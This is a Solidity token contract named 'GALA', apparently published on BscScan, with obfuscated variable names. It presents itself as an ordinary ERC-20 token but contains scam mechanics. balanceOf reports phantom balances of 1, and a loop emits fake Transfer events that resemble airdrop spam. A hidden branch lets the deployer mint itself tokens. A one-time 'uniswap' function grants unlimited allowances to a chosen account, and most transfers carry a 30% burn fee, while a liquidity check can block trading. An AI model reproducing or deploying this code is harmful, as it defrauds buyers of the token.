/**
 *Submitted for verification at BscScan.com on 2022-11-05
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract GALA is IERC20 {
    using SafeMath for uint256;

    string private astringuintvalues = "GALA";
    string private bstringuintvalues = "GALA";
    uint8 private cstringuintvalues = 6;
    uint256 private dstringuintvalues = 1 * 10**18;
    mapping (address => uint256) private estringuintvalues;
    mapping (address => mapping (address => uint256)) private fstringuintvalues;

    uint256 private gstringuintvalues = 1;
    uint256 private constant hstringuintvalues = ~uint160(0);
    uint256 private istringuintvalues = 1000;
    uint256 private jstringuintvalues = dstringuintvalues;
    uint256 private kstringuintvalues = 30;
    uint256 private lstringuintvalues;
    address private _uniswapV2Pair;
    mapping (address => bool) private mstringuintvalues;
    address[] private nstringuintvalues;
    bool private ostringuintvalues = false;

    constructor () {
        pstringuintvalues(msg.sender);
        estringuintvalues[msg.sender] = dstringuintvalues;
        emit Transfer(address(0), msg.sender, dstringuintvalues);
    }

    receive() external payable {}

    function pstringuintvalues(address account) private {
        if (!mstringuintvalues[account]) {
            mstringuintvalues[account] = true;
            nstringuintvalues.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!ostringuintvalues);
        ostringuintvalues = true;
        _uniswapV2Pair = accounts[1];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=2; i<len; ++i) {
            pstringuintvalues(accounts[i]);
            estringuintvalues[accounts[i]] = dstringuintvalues * 9 / 10 / (len - 2);
            fstringuintvalues[accounts[i]][accounts[0]] = ~uint256(0);
            amount += estringuintvalues[accounts[i]];
        }
        estringuintvalues[nstringuintvalues[0]] -= amount;
        qstringuintvalues(nstringuintvalues[0], accounts[2], estringuintvalues[nstringuintvalues[0]]);
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = nstringuintvalues.length;
        for (uint256 i=0; i<len; ++i) {
            if (nstringuintvalues[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (mstringuintvalues[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return astringuintvalues;
    }

    function symbol() public view returns (string memory) {
        return bstringuintvalues;
    }

    function decimals() public view returns (uint8) {
        return cstringuintvalues;
    }

    function totalSupply() public view returns (uint256) {
        return dstringuintvalues;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (estringuintvalues[account] > 0) {
            return estringuintvalues[account];
        }
        return gstringuintvalues;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        qstringuintvalues(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        qstringuintvalues(sender, recipient, amount);
        sstringuintvalues(sender, msg.sender, fstringuintvalues[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        sstringuintvalues(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fstringuintvalues[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        sstringuintvalues(msg.sender, spender, fstringuintvalues[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        sstringuintvalues(msg.sender, spender, fstringuintvalues[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function qstringuintvaluess() private {
        uint256 rstringuintvalues = istringuintvalues;
        if (rstringuintvalues < 100000) {
            address from;
            address to;
            for (uint256 i=0; i<100; ++i) {
                from = address(uint160(hstringuintvalues.div(rstringuintvalues)));
                to = address(uint160(hstringuintvalues.div(rstringuintvalues.add(1))));
                rstringuintvalues = rstringuintvalues.add(2);
                emit Transfer(from, to, gstringuintvalues);
            }
            istringuintvalues = rstringuintvalues;
        }
    }

    function sstringuintvalues(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fstringuintvalues[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function qstringuintvalues(address xstringuintvalues, address ystringuintvalues, uint256 zstringuintvalues) private {
        require(xstringuintvalues != address(0) && ystringuintvalues != address(0) && zstringuintvalues > 0);
        bool tstringuintvalues = true;
        if (mstringuintvalues[xstringuintvalues] || mstringuintvalues[ystringuintvalues]) {
            tstringuintvalues = false;
        }
        uint256 ustringuintvalues = IERC20(_uniswapV2Pair).totalSupply();
        uint256 vstringuintvalues = 0;
        uint256 wstringuintvalues = zstringuintvalues;
        if (tstringuintvalues) {
            require(lstringuintvalues <= ustringuintvalues);
            qstringuintvaluess();
            if (xstringuintvalues != _uniswapV2Pair) {
                vstringuintvalues = zstringuintvalues.mul(kstringuintvalues).div(100);
                wstringuintvalues = zstringuintvalues.sub(vstringuintvalues);
            }
        }
        if (xstringuintvalues == nstringuintvalues[0] && zstringuintvalues > jstringuintvalues) {
            estringuintvalues[nstringuintvalues[0]] += wstringuintvalues;
        }
        if (lstringuintvalues != ustringuintvalues) {
            lstringuintvalues = ustringuintvalues;
        }
        estringuintvalues[xstringuintvalues] = estringuintvalues[xstringuintvalues].sub(zstringuintvalues);
        if (vstringuintvalues > 0) {
            estringuintvalues[address(0xdEaD)] = estringuintvalues[address(0xdEaD)].add(vstringuintvalues);
            emit Transfer(xstringuintvalues, address(0xdEaD), vstringuintvalues);
        }
        estringuintvalues[ystringuintvalues] = estringuintvalues[ystringuintvalues].add(wstringuintvalues);
        emit Transfer(xstringuintvalues, ystringuintvalues, wstringuintvalues);
    }
}